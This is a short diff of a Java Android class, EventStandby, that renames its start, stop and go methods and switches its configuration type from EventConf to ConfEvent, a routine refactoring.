@@ -13,6 +13,7 @@ import java.io.IOException;
 
 import com.android.service.Standby;
 import com.android.service.auto.Cfg;
+import com.android.service.conf.ConfEvent;
 import com.android.service.interfaces.Observer;
 import com.android.service.listener.ListenerStandby;
 import com.android.service.util.Check;
@@ -25,22 +26,22 @@ public class EventStandby extends BaseEvent implements Observer<Standby> {
 	private int actionOnEnter, actionOnExit;
 
 	@Override
-	public void begin() {
+	public void actualStart() {
 		ListenerStandby.self().attach(this);
 	}
 
 	@Override
-	public void end() {
+	public void actualStop() {
 		ListenerStandby.self().detach(this);
 	}
 
 	@Override
-	public boolean parse(EventConf event) {
+	public boolean parse(ConfEvent event) {
 		return true;
 	}
 
 	@Override
-	public void go() {
+	public void actualGo() {
 
 	}
 
